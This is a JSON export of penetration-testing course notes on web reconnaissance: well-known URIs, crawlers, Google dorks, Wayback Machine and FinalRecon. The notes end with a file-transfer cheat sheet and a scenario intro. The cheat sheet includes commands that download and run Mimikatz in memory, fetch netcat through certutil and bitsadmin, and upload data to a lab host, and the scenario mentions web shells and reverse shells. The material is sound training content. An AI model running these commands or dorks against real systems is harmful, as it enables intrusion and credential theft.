\"jwks_uri\": \"https://example.com/oauth2/jwks\",\n  \"response_types_supported\": [\"code\", \"token\", \"id_token\"],\n  \"subject_types_supported\": [\"public\"],\n  \"id_token_signing_alg_values_supported\": [\"RS256\"],\n  \"scopes_supported\": [\"openid\", \"profile\", \"email\"]\n}\n```\n\nThe information obtained from the `openid-configuration` endpoint provides multiple exploration opportunities:\n\n1. `Endpoint Discovery`:\n    - `Authorization Endpoint`: Identifying the URL for user authorization requests.\n    - `Token Endpoint`: Finding the URL where tokens are issued.\n    - `Userinfo Endpoint`: Locating the endpoint that provides user information.\n2. `JWKS URI`: The `jwks_uri` reveals the `JSON Web Key Set` (`JWKS`), detailing the cryptographic keys used by the server.\n3. `Supported Scopes and Response Types`: Understanding which scopes and response types are supported helps in mapping out the functionality and limitations of the OpenID Connect implementation.\n4. `Algorithm Details`: Information about supported signing algorithms can be crucial for understanding the security measures in place.\n\nExploring the [IANA Registry](https://www.iana.org/assignments/well-known-uris/well-known-uris.xhtml) and experimenting with the various `.well-known` URIs is an invaluable approach to uncovering additional web reconnaissance opportunities. As demonstrated with the `openid-configuration` endpoint above, these standardized URIs provide structured access to critical metadata and configuration details, enabling security professionals to comprehensively map out a website's security landscape.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/16-Creepy Crawlies",
    "path": "02_CPTS/04-Information Gathering - Web Edition/16-Creepy Crawlies.md",
    "title": "16 Creepy Crawlies",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Web crawling is vast and intricate, but you don't have to embark on this journey alone. A plethora of web crawling tools are available to assist you, each with its own strengths and specialties. These...",
    "category": "02_CPTS",
    "content": "Web crawling is vast and intricate, but you don't have to embark on this journey alone. A plethora of web crawling tools are available to assist you, each with its own strengths and specialties. These tools automate the crawling process, making it faster and more efficient, allowing you to focus on analyzing the extracted data.\n\n## Popular Web Crawlers\n\n1. `Burp Suite Spider`: Burp Suite, a widely used web application testing platform, includes a powerful active crawler called Spider. Spider excels at mapping out web applications, identifying hidden content, and uncovering potential vulnerabilities.\n2. `OWASP ZAP (Zed Attack Proxy)`: ZAP is a free, open-source web application security scanner. It can be used in automated and manual modes and includes a spider component to crawl web applications and identify potential vulnerabilities.\n3. `Scrapy (Python Framework)`: Scrapy is a versatile and scalable Python framework for building custom web crawlers. It provides rich features for extracting structured data from websites, handling complex crawling scenarios, and automating data processing. Its flexibility makes it ideal for tailored reconnaissance tasks.\n4. `Apache Nutch (Scalable Crawler)`: Nutch is a highly extensible and scalable open-source web crawler written in Java. It's designed to handle massive crawls across the entire web or focus on specific domains. While it requires more technical expertise to set up and configure, its power and flexibility make it a valuable asset for large-scale reconnaissance projects.\n\nAdhering to ethical and responsible crawling practices is crucial no matter which tool you choose. Always obtain permission before crawling a website, especially if you plan to perform extensive or intrusive scans. Be mindful of the website's server resources and avoid overloading them with excessive requests.\n\n## Scrapy\n\nWe will leverage Scrapy and a custom spider tailored for reconnaissance on `inlanefreight.com`. If you are interested in more information on crawling/spidering techniques, refer to the \"[Using Web Proxies](https://academy.hackthebox.com/module/details/110)\" module, as it forms part of CBBH as well.\n\n### Installing Scrapy\n\nBefore we begin, ensure you have Scrapy installed on your system. If you don't, you can easily install it using pip, the Python package installer:\n\nCreepy Crawlies\n\n```shell-session\ndrxh3kr@htb[/htb]$ pip3 install scrapy\n```\n\nThis command will download and install Scrapy along with its dependencies, preparing your environment for building our spider.\n\n### ReconSpider\n\nFirst, run this command in your terminal to download the custom scrapy spider, `ReconSpider`, and extract it to the current working directory.\n\nCreepy Crawlies\n\n```shell-session\ndrxh3kr@htb[/htb]$ wget -O ReconSpider.zip https://academy.hackthebox.com/storage/modules/144/ReconSpider.v1.2.zip\ndrxh3kr@htb[/htb]$ unzip ReconSpider.zip \n```\n\nWith the files extracted, you can run `ReconSpider.py` using the following command:\n\nCreepy Crawlies\n\n```shell-session\ndrxh3kr@htb[/htb]$ python3 ReconSpider.py http://inlanefreight.com\n```\n\nReplace `inlanefreight.com` with the domain you want to spider. The spider will crawl the target and collect valuable information.\n\n### results.json\n\nAfter running `ReconSpider.py`, the data will be saved in a JSON file, `results.json`. This file can be explored using any text editor. Below is the structure of the JSON file produced:\n\nCode: json\n\n```json\n{\n    \"emails\": [\n        \"lily.floid@inlanefreight.com\",\n        \"cvs@inlanefreight.com\",\n        ...\n    ],\n    \"links\": [\n        \"https://www.themeansar.com\",\n        \"https://www.inlanefreight.com/index.php/offices/\",\n        ...\n    ],\n    \"external_files\": [\n        \"https://www.inlanefreight.com/wp-content/uploads/2020/09/goals.pdf\",\n        ...\n    ],\n    \"js_files\": [\n        \"https://www.inlanefreight.com/wp-includes/js/jquery/jquery-migrate.min.js?ver=3.3.2\",\n        ...\n    ],\n    \"form_fields\": [],\n    \"images\": [\n        \"https://www.inlanefreight.com/wp-content/uploads/2021/03/AboutUs_01-1024x810.png\",\n        ...\n    ],\n    \"videos\": [],\n    \"audio\": [],\n    \"comments\": [\n        \"<!-- #masthead -->\",\n        ...\n    ]\n}\n```\n\nEach key in the JSON file represents a different type of data extracted from the target website:\n\n|JSON Key|Description|\n|---|---|\n|`emails`|Lists email addresses found on the domain.|\n|`links`|Lists URLs of links found within the domain.|\n|`external_files`|Lists URLs of external files such as PDFs.|\n|`js_files`|Lists URLs of JavaScript files used by the website.|\n|`form_fields`|Lists form fields found on the domain (empty in this example).|\n|`images`|Lists URLs of images found on the domain.|\n|`videos`|Lists URLs of videos found on the domain (empty in this example).|\n|`audio`|Lists URLs of audio files found on the domain (empty in this example).|\n|`comments`|Lists HTML comments found in the source code.|\n\nBy exploring this JSON structure, you can gain valuable insights into the web application's architecture, content, and potential points of interest for further investigation.",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/17-Search Engine Discovery",
    "path": "02_CPTS/04-Information Gathering - Web Edition/17-Search Engine Discovery.md",
    "title": "17 Search Engine Discovery",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "Search engines serve as our guides in the vast landscape of the internet, helping us navigate through the seemingly endless expanse of information. However, beyond their primary function of answering ...",
    "category": "02_CPTS",
    "content": "Search engines serve as our guides in the vast landscape of the internet, helping us navigate through the seemingly endless expanse of information. However, beyond their primary function of answering everyday queries, search engines also hold a treasure trove of data that can be invaluable for web reconnaissance and information gathering. This practice, known as search engine discovery or OSINT (Open Source Intelligence) gathering, involves using search engines as powerful tools to uncover information about target websites, organisations, and individuals.\n\nAt its core, search engine discovery leverages the immense power of search algorithms to extract data that may not be readily visible on websites. Security professionals and researchers can delve deep into the indexed web by employing specialised search operators, techniques, and tools, uncovering everything from employee information and sensitive documents to hidden login pages and exposed credentials.\n\n## Why Search Engine Discovery Matters\n\nSearch engine discovery is a crucial component of web reconnaissance for several reasons:\n\n- `Open Source`: The information gathered is publicly accessible, making it a legal and ethical way to gain insights into a target.\n    \n- `Breadth of Information`: Search engines index a vast portion of the web, offering a wide range of potential information sources.\n    \n- `Ease of Use`: Search engines are user-friendly and require no specialised technical skills.\n    \n- `Cost-Effective`: It's a free and readily available resource for information gathering.\n    \n\nThe information you can pull together from Search Engines can be applied in several different ways as well:\n\n- `Security Assessment`: Identifying vulnerabilities, exposed data, and potential attack vectors.\n- `Competitive Intelligence`: Gathering information about competitors' products, services, and strategies.\n- `Investigative Journalism`: Uncovering hidden connections, financial transactions, and unethical practices.\n- `Threat Intelligence`: Identifying emerging threats, tracking malicious actors, and predicting potential attacks.\n\nHowever, it's important to note that search engine discovery has limitations. Search engines do not index all information, and some data may be deliberately hidden or protected.\n\n## Search Operators\n\nSearch operators are like search engines' secret codes. These special commands and modifiers unlock a new level of precision and control, allowing you to pinpoint specific types of information amidst the vastness of the indexed web.\n\nWhile the exact syntax may vary slightly between search engines, the underlying principles remain consistent. Let's delve into some essential and advanced search operators:\n\n|Operator|Operator Description|Example|Example Description|\n|:--|:--|:--|:--|\n|`site:`|Limits results to a specific website or domain.|`site:example.com`|Find all publicly accessible pages on example.com.|\n|`inurl:`|Finds pages with a specific term in the URL.|`inurl:login`|Search for login pages on any website.|\n|`filetype:`|Searches for files of a particular type.|`filetype:pdf`|Find downloadable PDF documents.|\n|`intitle:`|Finds pages with a specific term in the title.|`intitle:\"confidential report\"`|Look for documents titled \"confidential report\" or similar variations.|\n|`intext:` or `inbody:`|Searches for a term within the body text of pages.|`intext:\"password reset\"`|Identify webpages containing the term “password reset”.|\n|`cache:`|Displays the cached version of a webpage (if available).|`cache:example.com`|View the cached version of example.com to see its previous content.|\n|`link:`|Finds pages that link to a specific webpage.|`link:example.com`|Identify websites linking to example.com.|\n|`related:`|Finds websites related to a specific webpage.|`related:example.com`|Discover websites similar to example.com.|\n|`info:`|Provides a summary of information about a webpage.|`info:example.com`|Get basic details about example.com, such as its title and description.|\n|`define:`|Provides definitions of a word or phrase.|`define:phishing`|Get a definition of \"phishing\" from various sources.|\n|`numrange:`|Searches for numbers within a specific range.|`site:example.com numrange:1000-2000`|Find pages on example.com containing numbers between 1000 and 2000.|\n|`allintext:`|Finds pages containing all specified words in the body text.|`allintext:admin password reset`|Search for pages containing both \"admin\" and \"password reset\" in the body text.|\n|`allinurl:`|Finds pages containing all specified words in the URL.|`allinurl:admin panel`|Look for pages with \"admin\" and \"panel\" in the URL.|\n|`allintitle:`|Finds pages containing all specified words in the title.|`allintitle:confidential report 2023`|Search for pages with \"confidential,\" \"report,\" and \"2023\" in the title.|\n|`AND`|Narrows results by requiring all terms to be present.|`site:example.com AND (inurl:admin OR inurl:login)`|Find admin or login pages specifically on example.com.|\n|`OR`|Broadens results by including pages with any of the terms.|`\"linux\" OR \"ubuntu\" OR \"debian\"`|Search for webpages mentioning Linux, Ubuntu, or Debian.|\n|`NOT`|Excludes results containing the specified term.|`site:bank.com NOT inurl:login`|Find pages on bank.com excluding login pages.|\n|`*` (wildcard)|Represents any character or word.|`site:socialnetwork.com filetype:pdf user* manual`|Search for user manuals (user guide, user handbook) in PDF format on socialnetwork.com.|\n|`..` (range search)|Finds results within a specified numerical range.|`site:ecommerce.com \"price\" 100..500`|Look for products priced between 100 and 500 on an e-commerce website.|\n|`\" \"` (quotation marks)|Searches for exact phrases.|`\"information security policy\"`|Find documents mentioning the exact phrase \"information security policy\".|\n|`-` (minus sign)|Excludes terms from the search results.|`site:news.com -inurl:sports`|Search for news articles on news.com excluding sports-related content.|\n\n### Google Dorking\n\nGoogle Dorking, also known as Google Hacking, is a technique that leverages the power of search operators to uncover sensitive information, security vulnerabilities, or hidden content on websites, using Google Search.\n\nHere are some common examples of Google Dorks, for more examples, refer to the [Google Hacking Database](https://www.exploit-db.com/google-hacking-database):\n\n- Finding Login Pages:\n    - `site:example.com inurl:login`\n    - `site:example.com (inurl:login OR inurl:admin)`\n- Identifying Exposed Files:\n    - `site:example.com filetype:pdf`\n    - `site:example.com (filetype:xls OR filetype:docx)`\n- Uncovering Configuration Files:\n    - `site:example.com inurl:config.php`\n    - `site:example.com (ext:conf OR ext:cnf)` (searches for extensions commonly used for configuration files)\n- Locating Database Backups:\n    - `site:example.com inurl:backup`\n    - `site:example.com filetype:sql`",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/18-Web Archives",
    "path": "02_CPTS/04-Information Gathering - Web Edition/18-Web Archives.md",
    "title": "18 Web Archives",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "In the fast-paced digital world, websites come and go, leaving only fleeting traces of their existence behind. However, thanks to the Internet Archive's Wayback Machine, we have a unique opportunity t...",
    "category": "02_CPTS",
    "content": "In the fast-paced digital world, websites come and go, leaving only fleeting traces of their existence behind. However, thanks to the [Internet Archive's Wayback Machine](https://web.archive.org/), we have a unique opportunity to revisit the past and explore the digital footprints of websites as they once were.\n\n### What is the Wayback Machine?\n\n![Internet Archive Wayback Machine homepage with search bar for web pages, tools like browser extensions, and options for subscription service, collection search, and saving pages.](https://academy.hackthebox.com/storage/modules/144/wayback.png)\n\n`The Wayback Machine` is a digital archive of the World Wide Web and other information on the Internet. Founded by the Internet Archive, a non-profit organization, it has been archiving websites since 1996.\n\nIt allows users to \"go back in time\" and view snapshots of websites as they appeared at various points in their history. These snapshots, known as captures or archives, provide a glimpse into the past versions of a website, including its design, content, and functionality.\n\n### How Does the Wayback Machine Work?\n\nThe Wayback Machine operates by using web crawlers to capture snapshots of websites at regular intervals automatically. These crawlers navigate through the web, following links and indexing pages, much like how search engine crawlers work. However, instead of simply indexing the information for search purposes, the Wayback Machine stores the entire content of the pages, including HTML, CSS, JavaScript, images, and other resources.\n\nThe Wayback Machine's operation can be visualized as a three-step process:\n\n![Flowchart with three steps: Crawling, Archiving, Accessing.](https://mermaid.ink/svg/pako:eNpNjkEOgjAQRa_SzBou0IUJ4lI3uqQsJu1IG2lLhlZjCHe3YGLc_f9m8vMW0NEQSBgYJyvOVxWarmV8jS4Mvajrgzh2DWvrnhtQ4b_t57ZrtKZ53gBU4Ik9OlMWFxWEUJAseVIgSzTIDwUqrOUPc4q3d9AgE2eqgGMeLMg7jnNpeTKY6OSwaPkfJeNS5MtXePdeP1LGQQs)\n\n1. `Crawling`: The Wayback Machine employs automated web crawlers, often called \"bots,\" to browse the internet systematically. These bots follow links from one webpage to another, like how you would click hyperlinks to explore a website. However, instead of just reading the content, these bots download copies of the webpages they encounter.\n2. `Archiving`: The downloaded webpages, along with their associated resources like images, stylesheets, and scripts, are stored in the Wayback Machine's vast archive. Each captured webpage is linked to a specific date and time, creating a historical snapshot of the website at that moment. This archiving process happens at regular intervals, sometimes daily, weekly, or monthly, depending on the website's popularity and frequency of updates.\n3. `Accessing`: Users can access these archived snapshots through the Wayback Machine's interface. By entering a website's URL and selecting a date, you can view how the website looked at that specific point. The Wayback Machine allows you to browse individual pages and provides tools to search for specific terms within the archived content or download entire archived websites for offline analysis.\n\nThe frequency with which the Wayback Machine archives a website varies. Some websites might be archived multiple times a day, while others might only have a few snapshots spread out over several years. Factors that influence this frequency include the website's popularity, its rate of change, and the resources available to the Internet Archive.\n\nIt's important to note that the Wayback Machine does not capture every single webpage online. It prioritizes websites deemed to be of cultural, historical, or research value. Additionally, website owners can request that their content be excluded from the Wayback Machine, although this is not always guaranteed.\n\n## Why the Wayback Machine Matters for Web Reconnaissance\n\nThe Wayback Machine is a treasure trove for web reconnaissance, offering information that can be instrumental in various scenarios. Its significance lies in its ability to unveil a website's past, providing valuable insights that may not be readily apparent in its current state:\n\n1. `Uncovering Hidden Assets and Vulnerabilities`: The Wayback Machine allows you to discover old web pages, directories, files, or subdomains that might not be accessible on the current website, potentially exposing sensitive information or security flaws.\n2. `Tracking Changes and Identifying Patterns`: By comparing historical snapshots, you can observe how the website has evolved, revealing changes in structure, content, technologies, and potential vulnerabilities.\n3. `Gathering Intelligence`: Archived content can be a valuable source of OSINT, providing insights into the target's past activities, marketing strategies, employees, and technology choices.\n4. `Stealthy Reconnaissance`: Accessing archived snapshots is a passive activity that doesn't directly interact with the target's infrastructure, making it a less detectable way to gather information.\n\n## Going Wayback on HTB\n\nWe can view the first archived version of HackTheBox by entering the page we are looking for into the Wayback Machine and selecting the earliest available capture date, being `2017-06-10 @ 04h23:01`\n\n![Wayback Machine capture of Hack The Box homepage, version 0.8.7 beta, featuring a geometric cube logo and an 'About' section describing the platform for testing penetration skills.](https://academy.hackthebox.com/storage/modules/144/wayback-htb.png)",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/04-Information Gathering - Web Edition/19-Automating Recon",
    "path": "02_CPTS/04-Information Gathering - Web Edition/19-Automating Recon.md",
    "title": "19 Automating Recon",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "While manual reconnaissance can be effective, it can also be time-consuming and prone to human error. Automating web reconnaissance tasks can significantly enhance efficiency and accuracy, allowing yo...",
    "category": "02_CPTS",
    "content": "While manual reconnaissance can be effective, it can also be time-consuming and prone to human error. Automating web reconnaissance tasks can significantly enhance efficiency and accuracy, allowing you to gather information at scale and identify potential vulnerabilities more rapidly.\n\n## Why Automate Reconnaissance?\n\nAutomation offers several key advantages for web reconnaissance:\n\n- `Efficiency`: Automated tools can perform repetitive tasks much faster than humans, freeing up valuable time for analysis and decision-making.\n- `Scalability`: Automation allows you to scale your reconnaissance efforts across a large number of targets or domains, uncovering a broader scope of information.\n- `Consistency`: Automated tools follow predefined rules and procedures, ensuring consistent and reproducible results and minimising the risk of human error.\n- `Comprehensive Coverage`: Automation can be programmed to perform a wide range of reconnaissance tasks, including DNS enumeration, subdomain discovery, web crawling, port scanning, and more, ensuring thorough coverage of potential attack vectors.\n- `Integration`: Many automation frameworks allow for easy integration with other tools and platforms, creating a seamless workflow from reconnaissance to vulnerability assessment and exploitation.\n\n## Reconnaissance Frameworks\n\nThese frameworks aim to provide a complete suite of tools for web reconnaissance:\n\n- [FinalRecon](https://github.com/thewhiteh4t/FinalRecon): A Python-based reconnaissance tool offering a range of modules for different tasks like SSL certificate checking, Whois information gathering, header analysis, and crawling. Its modular structure enables easy customisation for specific needs.\n- [Recon-ng](https://github.com/lanmaster53/recon-ng): A powerful framework written in Python that offers a modular structure with various modules for different reconnaissance tasks. It can perform DNS enumeration, subdomain discovery, port scanning, web crawling, and even exploit known vulnerabilities.\n- [theHarvester](https://github.com/laramies/theHarvester): Specifically designed for gathering email addresses, subdomains, hosts, employee names, open ports, and banners from different public sources like search engines, PGP key servers, and the SHODAN database. It is a command-line tool written in Python.\n- [SpiderFoot](https://github.com/smicallef/spiderfoot): An open-source intelligence automation tool that integrates with various data sources to collect information about a target, including IP addresses, domain names, email addresses, and social media profiles. It can perform DNS lookups, web crawling, port scanning, and more.\n- [OSINT Framework](https://osintframework.com/): A collection of various tools and resources for open-source intelligence gathering. It covers a wide range of information sources, including social media, search engines, public records, and more.\n\n### FinalRecon\n\n`FinalRecon` offers a wealth of recon information:\n\n- `Header Information`: Reveals server details, technologies used, and potential security misconfigurations.\n- `Whois Lookup`: Uncovers domain registration details, including registrant information and contact details.\n- `SSL Certificate Information`: Examines the SSL/TLS certificate for validity, issuer, and other relevant details.\n- `Crawler`:\n    - HTML, CSS, JavaScript: Extracts links, resources, and potential vulnerabilities from these files.\n    - Internal/External Links: Maps out the website's structure and identifies connections to other domains.\n    - Images, robots.txt, sitemap.xml: Gathers information about allowed/disallowed crawling paths and website structure.\n    - Links in JavaScript, Wayback Machine: Uncovers hidden links and historical website data.\n- `DNS Enumeration`: Queries over 40 DNS record types, including DMARC records for email security assessment.\n- `Subdomain Enumeration`: Leverages multiple data sources (crt.sh, AnubisDB, ThreatMiner, CertSpotter, Facebook API, VirusTotal API, Shodan API, BeVigil API) to discover subdomains.\n- `Directory Enumeration`: Supports custom wordlists and file extensions to uncover hidden directories and files.\n- `Wayback Machine`: Retrieves URLs from the last five years to analyse website changes and potential vulnerabilities.\n\nInstallation is quick and easy:\n\nAutomating Recon\n\n```shell-session\ndrxh3kr@htb[/htb]$ git clone https://github.com/thewhiteh4t/FinalRecon.git\ndrxh3kr@htb[/htb]$ cd FinalRecon\ndrxh3kr@htb[/htb]$ pip3 install -r requirements.txt\ndrxh3kr@htb[/htb]$ chmod +x ./finalrecon.py\ndrxh3kr@htb[/htb]$ ./finalrecon.py --help\n\nusage: finalrecon.py [-h] [--url URL] [--headers] [--sslinfo] [--whois]\n                     [--crawl] [--dns] [--sub] [--dir] [--wayback] [--ps]\n                     [--full] [-nb] [-dt DT] [-pt PT] [-T T] [-w W] [-r] [-s]\n                     [-sp SP] [-d D] [-e E] [-o O] [-cd CD] [-k K]\n\nFinalRecon - All in One Web Recon | v1.1.6\n\noptional arguments:\n  -h, --help  show this help message and exit\n  --url URL   Target URL\n  --headers   Header Information\n  --sslinfo   SSL Certificate Information\n  --whois     Whois Lookup\n  --crawl     Crawl Target\n  --dns       DNS Enumeration\n  --sub       Sub-Domain Enumeration\n  --dir       Directory Search\n  --wayback   Wayback URLs\n  --ps        Fast Port Scan\n  --full      Full Recon\n\nExtra Options:\n  -nb         Hide Banner\n  -dt DT      Number of threads for directory enum [ Default : 30 ]\n  -pt PT      Number of threads for port scan [ Default : 50 ]\n  -T T        Request Timeout [ Default : 30.0 ]\n  -w W        Path to Wordlist [ Default : wordlists/dirb_common.txt ]\n  -r          Allow Redirect [ Default : False ]\n  -s          Toggle SSL Verification [ Default : True ]\n  -sp SP      Specify SSL Port [ Default : 443 ]\n  -d D        Custom DNS Servers [ Default : 1.1.1.1 ]\n  -e E        File Extensions [ Example : txt, xml, php ]\n  -o O        Export Format [ Default : txt ]\n  -cd CD      Change export directory [ Default : ~/.local/share/finalrecon ]\n  -k K        Add API key [ Example : shodan@key ]\n```\n\nTo get started, you will first clone the `FinalRecon` repository from GitHub using `git clone https://github.com/thewhiteh4t/FinalRecon.git`. This will create a new directory named \"FinalRecon\" containing all the necessary files.\n\nNext, navigate into the newly created directory with `cd FinalRecon`. Once inside, you will install the required Python dependencies using `pip3 install -r requirements.txt`. This ensures that `FinalRecon` has all the libraries and modules it needs to function correctly.\n\nTo ensure that the main script is executable, you will need to change the file permissions using `chmod +x ./finalrecon.py`. This allows you to run the script directly from your terminal.\n\nFinally, you can verify that `FinalRecon` is installed correctly and get an overview of its available options by running `./finalrecon.py --help`. This will display a help message with details on how to use the tool, including the various modules and their respective options:\n\n|Option|Argument|Description|\n|---|---|---|\n|`-h`, `--help`||Show the help message and exit.|\n|`--url`|URL|Specify the target URL.|\n|`--headers`||Retrieve header information for the target URL.|\n|`--sslinfo`||Get SSL certificate information for the target URL.|\n|`--whois`||Perform a Whois lookup for the target domain.|\n|`--crawl`||Crawl the target website.|\n|`--dns`||Perform DNS enumeration on the target domain.|\n|`--sub`||Enumerate subdomains for the target domain.|\n|`--dir`||Search for directories on the target website.|\n|`--wayback`||Retrieve Wayback URLs for the target.|\n|`--ps`||Perform a fast port scan on the target.|\n|`--full`||Perform a full reconnaissance scan on the target.|\n\nFor instance, if we want `FinalRecon` to gather header information and perform a Whois lookup for `inlanefreight.com`, we would use the corresponding flags (`--headers` and `--whois`), so the command would be:\n\nAutomating Recon\n\n```shell-session\ndrxh3kr@htb[/htb]$ ./finalrecon.py --headers --whois --url http://inlanefreight.com\n\n ______  __   __   __   ______   __\n/\\  ___\\/\\ \\ /\\ \"-.\\ \\ /\\  __ \\ /\\ \\\n\\ \\  __\\\\ \\ \\\\ \\ \\-.  \\\\ \\  __ \\\\ \\ \\____\n \\ \\_\\   \\ \\_\\\\ \\_\\\\\"\\_\\\\ \\_\\ \\_\\\\ \\_____\\\n  \\/_/    \\/_/ \\/_/ \\/_/ \\/_/\\/_/ \\/_____/\n ______   ______   ______   ______   __   __\n/\\  == \\ /\\  ___\\ /\\  ___\\ /\\  __ \\ /\\ \"-.\\ \\\n\\ \\  __< \\ \\  __\\ \\ \\ \\____\\ \\ \\/\\ \\\\ \\ \\-.  \\\n \\ \\_\\ \\_\\\\ \\_____\\\\ \\_____\\\\ \\_____\\\\ \\_\\\\\"\\_\\\n  \\/_/ /_/ \\/_____/ \\/_____/ \\/_____/ \\/_/ \\/_/\n\n[>] Created By   : thewhiteh4t\n |---> Twitter   : https://twitter.com/thewhiteh4t\n |---> Community : https://twc1rcle.com/\n[>] Version      : 1.1.6\n\n[+] Target : http://inlanefreight.com\n\n[+] IP Address : 134.209.24.248\n\n[!] Headers :\n\nDate : Tue, 11 Jun 2024 10:08:00 GMT\nServer : Apache/2.4.41 (Ubuntu)\nLink : <https://www.inlanefreight.com/index.php/wp-json/>; rel=\"https://api.w.org/\", <https://www.inlanefreight.com/index.php/wp-json/wp/v2/pages/7>; rel=\"alternate\"; type=\"application/json\", <https://www.inlanefreight.com/>; rel=shortlink\nVary : Accept-Encoding\nContent-Encoding : gzip\nContent-Length : 5483\nKeep-Alive : timeout=5, max=100\nConnection : Keep-Alive\nContent-Type : text/html; charset=UTF-8\n\n[!] Whois Lookup : \n\n   Domain Name: INLANEFREIGHT.COM\n   Registry Domain ID: 2420436757_DOMAIN_COM-VRSN\n   Registrar WHOIS Server: whois.registrar.amazon.com\n   Registrar URL: http://registrar.amazon.com\n   Updated Date: 2023-07-03T01:11:15Z\n   Creation Date: 2019-08-05T22:43:09Z\n   Registry Expiry Date: 2024-08-05T22:43:09Z\n   Registrar: Amazon Registrar, Inc.\n   Registrar IANA ID: 468\n   Registrar Abuse Contact Email: abuse@amazonaws.com\n   Registrar Abuse Contact Phone: +1.2024422253\n   Domain Status: clientDeleteProhibited https://icann.org/epp#clientDeleteProhibited\n   Domain Status: clientTransferProhibited https://icann.org/epp#clientTransferProhibited\n   Domain Status: clientUpdateProhibited https://icann.org/epp#clientUpdateProhibited\n   Name Server: NS-1303.AWSDNS-34.ORG\n   Name Server: NS-1580.AWSDNS-05.CO.UK\n   Name Server: NS-161.AWSDNS-20.COM\n   Name Server: NS-671.AWSDNS-19.NET\n   DNSSEC: unsigned\n   URL of the ICANN Whois Inaccuracy Complaint Form: https://www.icann.org/wicf/\n\n\n[+] Completed in 0:00:00.257780\n\n[+] Exported : /home/htb-ac-643601/.local/share/finalrecon/dumps/fr_inlanefreight.com_11-06-2024_11:07:59\n\n```",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/01-Cheet Sheet File Transfer",
    "path": "02_CPTS/06-File Transfers/01-Cheet Sheet File Transfer.md",
    "title": "01 Cheet Sheet File Transfer",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "| Command                                                                                                        | Description                             | | -----------------------------------------...",
    "category": "02_CPTS",
    "content": "\n| **Command**                                                                                                        | **Description**                             |\n| ------------------------------------------------------------------------------------------------------------------ | ------------------------------------------- |\n| `Invoke-WebRequest https://<snip>/PowerView.ps1 -OutFile PowerView.ps1`                                            | Download a file with PowerShell             |\n| `IEX (New-Object Net.WebClient).DownloadString('https://<snip>/Invoke-Mimikatz.ps1')`                              | Execute a file in memory using PowerShell   |\n| `Invoke-WebRequest -Uri http://10.10.10.32:443 -Method POST -Body $b64`                                            | Upload a file with PowerShell               |\n| `bitsadmin /transfer n http://10.10.10.32/nc.exe C:\\Temp\\nc.exe`                                                   | Download a file using Bitsadmin             |\n| `certutil.exe -verifyctl -split -f http://10.10.10.32/nc.exe`                                                      | Download a file using Certutil              |\n| `wget https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh -O /tmp/LinEnum.sh`                   | Download a file using Wget                  |\n| `curl -o /tmp/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh`                   | Download a file using cURL                  |\n| `php -r '$file = file_get_contents(\"https://<snip>/LinEnum.sh\"); file_put_contents(\"LinEnum.sh\",$file);'`          | Download a file using PHP                   |\n| `scp C:\\Temp\\bloodhound.zip user@10.10.10.150:/tmp/bloodhound.zip`                                                 | Upload a file using SCP                     |\n| `scp user@target:/tmp/mimikatz.exe C:\\Temp\\mimikatz.exe`                                                           | Download a file using SCP                   |\n| `Invoke-WebRequest http://nc.exe -UserAgent [Microsoft.PowerShell.Commands.PSUserAgent]::Chrome -OutFile \"nc.exe\"` | Invoke-WebRequest using a Chrome User Agent |\n\n",
    "frontmatter": {}
  },
  {
    "slug": "02_CPTS/06-File Transfers/02-File Transfers",
    "path": "02_CPTS/06-File Transfers/02-File Transfers.md",
    "title": "02 File Transfers",
    "tags": [],
    "date": "2025-09-17",
    "excerpt": "There are many situations when transferring files to or from a target system is necessary. Let's imagine the following scenario: Setting the Stage During an engagement, we gain remote code execution (...",
    "category": "02_CPTS",
    "content": "There are many situations when transferring files to or from a target system is necessary. Let's imagine the following scenario:\n\n**Setting the Stage**\n\nDuring an engagement, we gain remote code execution (RCE) on an IIS web server via an unrestricted file upload vulnerability. We upload a web shell initially and then send ourselves a reverse shell to enumerate the system further in an attempt to escalate privileges. We attempt to use PowerShell to transfer [PowerUp.ps1](https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1) (a PowerShell script to enumerate privilege escalation vectors), but PowerShell is blocked by the [Application Control Policy](https://docs.microsoft.com/en-us/windows/security/threat-protection/windows-defender-application-control/windows-defender-application-control). We perform our local enumeration manually and find that we have [SeImpersonatePrivilege](https://docs.microsoft.com/en-us/troubleshoot/windows-server/windows-security/seimpersonateprivilege-secreateglobalprivilege). We need to transfer a binary to our target machine to escalate privileges using the [PrintSpoofer](https://github.com/itm4n/PrintSpoofer) tool. We then try to use [Certutil](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/certutil) to download the file we compiled ourselves directly from our own GitHub, but the organization has strong web content filtering in place. We cannot access websites such as GitHub, Dropbox, Google Drive, etc., that can be used to transfer files. Next, we set up an FTP Server and tried to use the Windows FTP client to transfer files, but the network firewall blocked outbound traffic for port 21 (TCP). We tried to use the [Impacket smbserver](https://github.com/SecureAuthCorp/impacket/blob/master/examples/smbserver.py) tool to create a folder, and we found that outgoing traffic to TCP port 445 (SMB) was allowed. We used this file transfer method to successfully copy the binary onto our target machine and accomplish our goal of escalating privileges to an administrator-level user.\n\nUnderstanding different ways to perform file transfers and how networks operate can help us accomplish our goals during an assessment. We must be aware of host controls that may prevent our actions, like application whitelisting or AV/EDR blocking specific applications or activities. File transfers are also affected by network devices such as Firewalls, IDS, or IPS which can monitor or block particular ports or uncommon operations.\n\nFile transfer is a core feature of any operating system, and many tools exist to achieve this. However, many of these tools may be blocked or monitored by diligent administrators, and it is worth reviewing a range of techniques that may be possible in a given environment.\n\nThis module covers techniques that leverage tools and applications commonly available on Windows and Linux systems. The list of techniques is not exhaustive. The information within this module can also be used as a reference guide when working through other HTB Academy modules, as many of the in-module exercises will require us to transfer files to/from a target host or to/from the provided Pwnbox. Target Windows and Linux machines are provided to complete a few hands-on exercises as part of the module. It is worth utilizing these targets to experiment with as many of the techniques 